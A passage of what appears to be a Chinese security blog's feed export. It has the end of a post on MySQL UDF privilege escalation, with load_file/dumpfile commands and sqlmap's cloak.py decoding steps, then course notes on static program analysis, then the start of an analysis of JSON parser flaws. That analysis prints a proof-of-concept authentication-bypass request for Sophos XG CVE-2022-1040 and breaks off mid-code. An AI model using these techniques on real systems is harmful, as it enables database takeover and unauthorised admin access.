<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131152927985.png" class="" title="image-20210131152927985">

<h3 id="如何获取该udf-dll-so-文件的16进制值-hex"><a href="#如何获取该udf-dll-so-文件的16进制值-hex" class="headerlink" title="如何获取该udf.dll(.so)文件的16进制值(hex)"></a><strong>如何获取该udf.dll(.so)文件的16进制值(hex)</strong></h3><p>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> hex(load_file (<span class="string">&#x27;c:/windows/temp/xxoo.dll&#x27;</span>)) <span class="keyword">into</span> outfile <span class="string">&#x27;c:/windows/temp/xxoo.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者使用xxd命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat udf.so|xxd -ps</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码"><a href="#sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码" class="headerlink" title="sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码"></a><strong>sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解码工具为sqlmap自带的SQLmap\extra\cloak\cloak.py</span></span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_</span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\linux\<span class="number">64</span>\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131161956660.png" class="" title="image-20210131161956660">

<h3 id="dumpfile和outfile有什么不一样"><a href="#dumpfile和outfile有什么不一样" class="headerlink" title="dumpfile和outfile有什么不一样"></a><strong>dumpfile和outfile有什么不一样</strong></h3><p>outfile适合导库，会在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p>
<p>into dumpfile 就能导出 一个完整能执行的2进制文件。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udf提权<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>《静态程序分析（南京大学）》课程笔记</title>
    <url>/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>注：⭐️符号代表重要的知识点，课程还未学习完，笔记更新中ing</p>
<h2 id="1-Intermediate-Representation-IR-（第二节课）"><a href="#1-Intermediate-Representation-IR-（第二节课）" class="headerlink" title="1. Intermediate Representation(IR)（第二节课）"></a>1. Intermediate Representation(IR)（第二节课）</h2><h3 id="1-1-AST-VS-IR"><a href="#1-1-AST-VS-IR" class="headerlink" title="1.1 AST VS IR"></a>1.1 AST VS IR</h3><p>编译器运行流程</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185425580.png" class="" title="image-20220103185425580">

<p>程序到静态分析的流程理解：<strong>程序-&gt;IR(3addr 3地址码)-&gt;CFG-&gt;静态分析</strong></p>
<p>AST与IR的区别</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185553431.png" class="" title="image-20220103185553431">

<h3 id="1-2-What-IR-Soot’s-IR-Jimple"><a href="#1-2-What-IR-Soot’s-IR-Jimple" class="headerlink" title="1.2 What IR(Soot’s IR:Jimple)"></a>1.2 What IR(Soot’s IR:Jimple)</h3><p><strong>demo1:do while loop</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185733224.png" class="" title="image-20220103185733224">
<p><strong>demo2:method call</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185756327.png" class="" title="image-20220103185756327">
<p><strong>demo3:class</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185813310.png" class="" title="image-20220103185813310">
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103185825140.png" class="" title="image-20220103185825140">

<h3 id="1-3-Control-Flow-Graph-CFG"><a href="#1-3-Control-Flow-Graph-CFG" class="headerlink" title="1.3 Control Flow Graph(CFG)"></a>1.3 Control Flow Graph(CFG)</h3><h4 id="1-3-1-graph-nodes-basi，c-blocks-BB"><a href="#1-3-1-graph-nodes-basi，c-blocks-BB" class="headerlink" title="1.3.1 graph nodes : basi，c blocks(BB)"></a>1.3.1 graph nodes : basi，c blocks(BB)</h4><h5 id="Basic-Blocks定义"><a href="#Basic-Blocks定义" class="headerlink" title="Basic Blocks定义"></a><strong>Basic Blocks定义</strong></h5><p>入口和出口都是唯一的最大3地址码顺序集合</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103190319354.png" class="" title="image-20220103190319354">

<h5 id="⭐️判别Basic-Blocks方法"><a href="#⭐️判别Basic-Blocks方法" class="headerlink" title="⭐️判别Basic Blocks方法"></a>⭐️<strong>判别Basic Blocks方法</strong></h5><p><strong>step1 ：先找到所有BB的入口(leaders)，可通过下面3中方法判定</strong></p>
<ul>
<li><strong>程序中的第一条指令</strong></li>
<li><strong>任何被jump (goto) 到的目标都为leader</strong></li>
<li><strong>任何紧跟jump语句后的语句都为leader</strong></li>
</ul>
<p><strong>step2：一个leader和后面的所有指令，直到下一个leader为止</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103193220938.png" class="" title="image-20220103193220938">



<h5 id="例子：3AC转换BBs"><a href="#例子：3AC转换BBs" class="headerlink" title="例子：3AC转换BBs"></a><strong>例子：3AC转换BBs</strong></h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103195204869.png" class="" title="image-20220103195204869">

<h4 id="1-3-2-Graph-edge"><a href="#1-3-2-Graph-edge" class="headerlink" title="1.3.2 Graph edge"></a>1.3.2 Graph edge</h4><h5 id="⭐️如何给BBs加边"><a href="#⭐️如何给BBs加边" class="headerlink" title="⭐️如何给BBs加边"></a>⭐️如何给BBs加边</h5><p><strong>1.不管有无条件的jump，起点与目标的连线</strong></p>
<p><strong>2.正常的无条件指令，按执行顺序依次连线</strong></p>
<p><strong>3.第1条的连线用jump指令所在的BB连线代替，如下图A与B</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103200344933.png" class="" title="image-20220103200344933">

<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103201711683.png" class="" title="image-20220103201711683">

<h2 id="2-Data-Flow-Analysis-Applications-（第三、四节课）"><a href="#2-Data-Flow-Analysis-Applications-（第三、四节课）" class="headerlink" title="2.  Data Flow Analysis - Applications （第三、四节课）"></a>2.  Data Flow Analysis - Applications （第三、四节课）</h2><p>下面介绍3钟不同的数据流分析算法，通过算法可以解出CFG可流通的路径，算法不同，路径结果也不同</p>
<h3 id="2-1-前置知识"><a href="#2-1-前置知识" class="headerlink" title="2.1 前置知识"></a>2.1 前置知识</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183449579.png" class="" title="image-20220103183449579">

<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103183816522.png" class="" title="image-20220103183816522">



<h3 id="2-2-Reaching-Definitions-Analysis"><a href="#2-2-Reaching-Definitions-Analysis" class="headerlink" title="2.2 Reaching Definitions Analysis"></a>2.2 Reaching Definitions Analysis</h3><h4 id="Reaching-Definitions-定义解析"><a href="#Reaching-Definitions-定义解析" class="headerlink" title="Reaching Definitions 定义解析"></a>Reaching Definitions 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103114709803.png" class="" title="image-20220103114709803">

<h4 id="⭐️Reaching-Definitions-实现算法"><a href="#⭐️Reaching-Definitions-实现算法" class="headerlink" title="⭐️Reaching Definitions 实现算法"></a>⭐️Reaching Definitions 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115143201.png" class="" title="image-20220103115143201">

<h4 id="Reaching-Definitions-实例演示"><a href="#Reaching-Definitions-实例演示" class="headerlink" title="Reaching Definitions 实例演示"></a>Reaching Definitions 实例演示</h4><p>每一个变量赋值表达式子用都代表一个Definition，这里用Dn表示，蓝色代表变量x，红色代表y，黑色代表m，绿色代表z</p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103115459081.png" class="" title="image-20220103115459081">

<h3 id="2-3-Live-Variables-Analysis-（第四节课）"><a href="#2-3-Live-Variables-Analysis-（第四节课）" class="headerlink" title="2.3 Live Variables Analysis （第四节课）"></a>2.3 Live Variables Analysis （第四节课）</h3><h4 id="Live-Variables-定义解析"><a href="#Live-Variables-定义解析" class="headerlink" title="Live Variables 定义解析"></a>Live Variables 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103123845303.png" class="" title="image-20220103123845303">

<h4 id="⭐️Live-Variables-实现算法"><a href="#⭐️Live-Variables-实现算法" class="headerlink" title="⭐️Live Variables 实现算法"></a>⭐️Live Variables 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103163513747.png" class="" title="image-20220103163513747">

<h4 id="Live-Variables-实例演示"><a href="#Live-Variables-实例演示" class="headerlink" title="Live Variables 实例演示"></a>Live Variables 实例演示</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103174745109.png" class="" title="image-20220103174745109">

<h3 id="2-4-Available-Expressions-Analysis"><a href="#2-4-Available-Expressions-Analysis" class="headerlink" title="2.4 Available Expressions Analysis"></a>2.4 Available Expressions Analysis</h3><h4 id="Available-Expressions-定义解析"><a href="#Available-Expressions-定义解析" class="headerlink" title="Available Expressions 定义解析"></a>Available Expressions 定义解析</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180809651.png" class="" title="image-20220103180809651">

<h4 id="⭐️Available-Expressions-实现算法"><a href="#⭐️Available-Expressions-实现算法" class="headerlink" title="⭐️Available Expressions 实现算法"></a>⭐️Available Expressions 实现算法</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180018797.png" class="" title="image-20220103180018797">

<h4 id="Available-Expressions-示例演示"><a href="#Available-Expressions-示例演示" class="headerlink" title="Available Expressions 示例演示"></a>Available Expressions 示例演示</h4><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103180716543.png" class="" title="image-20220103180716543">

<h3 id="⭐️2-5-三种数据流分析应用对比"><a href="#⭐️2-5-三种数据流分析应用对比" class="headerlink" title="⭐️2.5 三种数据流分析应用对比"></a>⭐️2.5 三种数据流分析应用对比</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220103181138043.png" class="" title="image-20220103181138043">

<h2 id="3-Data-Flow-Analysis-Foundations-（第五、六节课）"><a href="#3-Data-Flow-Analysis-Foundations-（第五、六节课）" class="headerlink" title="3. Data Flow Analysis - Foundations （第五、六节课）"></a>3. Data Flow Analysis - Foundations （第五、六节课）</h2><h3 id="⭐️3-1-Iterative-Algorithm-Another-View"><a href="#⭐️3-1-Iterative-Algorithm-Another-View" class="headerlink" title="⭐️3.1 Iterative Algorithm, Another View"></a>⭐️3.1 Iterative Algorithm, Another View</h3><p>前面3中数据流分析算法满足<strong>不动点定律</strong></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109104249059.png" class="" title="image-20220109104249059">

<h3 id="3-2-Partial-Order"><a href="#3-2-Partial-Order" class="headerlink" title="3.2 Partial Order"></a>3.2 Partial Order</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135207135.png" class="" title="image-20220109135207135">

<h3 id="3-3-Upper-and-Lower-Bounds"><a href="#3-3-Upper-and-Lower-Bounds" class="headerlink" title="3.3 Upper and Lower Bounds"></a>3.3 Upper and Lower Bounds</h3><img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135035140.png" class="" title="image-20220109135035140">

<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109140408193.png" class="" title="image-20220109140408193">

<h3 id="⭐️3-4-Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#⭐️3-4-Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="⭐️3.4 Lattice, Semilattice, Complete and Product Lattice"></a>⭐️3.4 Lattice, Semilattice, Complete and Product Lattice</h3><ul>
<li><strong>Lattice(格)：poset中的任意2个元素，都存在最小上界和最大下界</strong></li>
<li><strong>Semilattice(半格)：poset中的任意2个元素，只有上界或只有下界</strong></li>
<li><strong>Complete Lattice(完全格)：一个Lattice的任意子集都存在最小上界和最大下界，则称为Complete Lattice</strong><ul>
<li>其实finite的lattice一定是Complete Lattice（反过来不一定）</li>
</ul>
</li>
<li><strong>Product Lattice：可理解为多个Lattice的笛卡尔积</strong><ul>
<li>Product Lattice也是一个Lattice</li>
<li>构成Product Lattice的每一个Lattice都是Complete的，那么这个Product Lattice也是Complete</li>
</ul>
</li>
</ul>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109135417528.png" class="" title="image-20220109135417528">

<p>.<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109143223130.png" class="" title="image-20220109143223130"></p>
<img src="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20220109142123333.png" class="" title="image-20220109142123333">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://space.bilibili.com/2919428/channel/seriesdetail?sid=1006553&ctype=0" >课程视频<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://pascal-group.bitbucket.io/teaching.html" >课件<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>JSON解析不一致性漏洞探究</title>
    <url>/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="json解析器差异导致的安全问题"><a href="#json解析器差异导致的安全问题" class="headerlink" title="json解析器差异导致的安全问题"></a>json解析器差异导致的安全问题</h1><blockquote>
<p>前段时间在准备技术分享内容，看到JSON Interoperability类型的漏洞，感觉还挺有意思，整理一些案例和工具分享下</p>
</blockquote>
<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1.背景"></a>1.背景</h1><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，易于人阅读和编写，同时也易 于机器解析和生成。它基于JavaScript语言标准ECMA-262第3版（1999年12月）的一个子集。随着时间的推移，JSON已经超越了JavaScript，成为许多编程语言支持的标准数据格式之一。</p>
<p> 如HTTP 请求走私等攻击一样，<strong>json解析器之间以及多阶段请求处理的差异可能引入严重的漏洞</strong>，即使是在严格遵守规范的解析器，也不可避免的与规范存在偏差，这是为什么？</p>
<p>1.<strong>关于JSON的规范有多个，各规范定义有一定的差异</strong></p>
<ul>
<li><a class="link"   href="https://262.ecma-international.org/" >ECMAScript Standard<i class="fas fa-external-link-alt"></i></a>：ECMAScript是JavaScript语言的标准化名称，定义了JSON作为JavaScript的一个子集，但实际应用超出了JavaScript</li>
<li><a class="link"   href="https://datatracker.ietf.org/doc/html/rfc8259" >IETF JSON RFC 8259<i class="fas fa-external-link-alt"></i></a>：提供了一个严格和精确的JSON数据交换格式规范，这个标准旨在确保JSON数据的交换在不同的系统间能够保持一致性和可靠性</li>
<li>……</li>
</ul>
<p>2.<strong>规范文档对于一些定义是开放式的描述</strong>，例如 IETF JSON RFC 8259 对重复键的描述</p>
<blockquote>
<p><em>An object whose names are all unique is interoperable in the sense that all software implementations receiving that object will agree on the name-value mappings. When the names within an object are not unique, the behavior of software that receives such an object is unpredictable. Many implementations report the last name&#x2F;value pair only. Other implementations report an error or fail to parse the object, and some implementations report all of the name&#x2F;value pairs, including duplicates.</em></p>
</blockquote>
<p>只是说明了各种解析器对重复键值处理的各种现象，并没有规定当重复键出现时应怎么处理。</p>
<p><strong>那么主要有哪些JSON解析差异可能会导致漏洞？</strong></p>
<ul>
<li>重复键的优先级差异。</li>
<li>特殊键解析差异：字符截断和注释</li>
<li>JSON序列化结构差异</li>
<li>浮点数和整数表示差异</li>
<li>解析容错机制和其他bug</li>
<li>……</li>
</ul>
<p>更多的差异分类和细节可参考<a class="link"   href="https://bishopfox.com/blog/json-interoperability-vulnerabilities" >https://bishopfox.com/blog/json-interoperability-vulnerabilities<i class="fas fa-external-link-alt"></i></a>，下面我们看一些真实的cve漏洞案例。</p>
<h1 id="2-漏洞案例"><a href="#2-漏洞案例" class="headerlink" title="2.漏洞案例"></a>2.漏洞案例</h1><h2 id="案例1：Sophos-XG认证绕过-CVE-2022-1040"><a href="#案例1：Sophos-XG认证绕过-CVE-2022-1040" class="headerlink" title="案例1：Sophos XG认证绕过 CVE-2022-1040"></a>案例1：Sophos XG认证绕过 CVE-2022-1040</h2><p><strong>数据流</strong></p>
<p>Sophos XG Firewall各组件调用关系可以简化如下</p>
<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled-1715053743878-1.png" class="" title="Untitled">

<p>apache接受用户的http请求后转发给jetty处理过滤后，通过类似于 HTTP 的 TCP 和 UDP 协议转发给csc服务，csc处理系统的核心业务，它的核心部分是用C语言编写的，逻辑部分是通过Perl C语言接口（Perl C Language Interface）用Perl语言编写的。</p>
<p><strong>核心方法分析</strong></p>
<p>具体的漏洞细节分析这里不做过多描述，参考 <a class="link"   href="https://blog.viettelcybersecurity.com/cve-2022-1040-sophos-xg-firewall-authentication-bypass/" >https://blog.viettelcybersecurity.com/cve-2022-1040-sophos-xg-firewall-authentication-bypass/<i class="fas fa-external-link-alt"></i></a></p>
<p>我们这里只分析下关键的绕过逻辑，看下登录绕过的poc数据包</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /webconsole/Controller HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="comment">// Other request header</span></span><br><span class="line"></span><br><span class="line">mode=<span class="number">151</span>&amp;json=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;somethingnotpassword&quot;</span>,<span class="string">&quot;languageid&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;browser&quot;</span>:<span class="string">&quot;Chrome_123&quot;</span>,<span class="string">&quot;accessaction&quot;</span>:<span class="number">1</span>,<span class="string">&quot;mode\u0000p0melo&quot;</span>:<span class="number">716</span>&#125;&amp;__RequestType=ajax&amp;t=<span class="number">1712025156789</span></span><br></pre></td></tr></table></figure>

<p>主要起作用的是<code>mode</code>和<code>json</code>两个参数，jetty侧会通过<code>org.json-20090211</code>这个库解析json参数传的json数据，通过<code>cscClient.generateAndSendAjaxEvent</code>发送到CSC做认证，发送前会将<code>mode</code>参数<code>put</code>到解析后的json中，如果这里返回的状态码是200或者201，则认为是登录认证通过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebAdminAuth</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(<span class="keyword">final</span> HttpServletRequest request, <span class="keyword">final</span> HttpServletResponse response, <span class="keyword">final</span> EventBean eventBean, <span class="keyword">final</span> SqlReader sqlReader)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(request.getParameter(<span class="string">&quot;json&quot;</span>));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">languageId</span> <span class="operator">=</span> jsonObject.getInt(<span class="string">&quot;languageid&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">returnedStatus</span> <span class="operator">=</span> cscClient.generateAndSendAjaxEvent(request, response, eventBean, sqlReader);</span><br><span class="line">    <span class="keyword">if</span> (returnedStatus != <span class="number">200</span> &amp;&amp; returnedStatus != <span class="number">201</span>) &#123;</span><br><span class="line">	    <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">uname</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> (jsonObject.has(<span class="string">&quot;username&quot;</span>)) &#123;</span><br><span class="line">        uname = jsonObject.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">      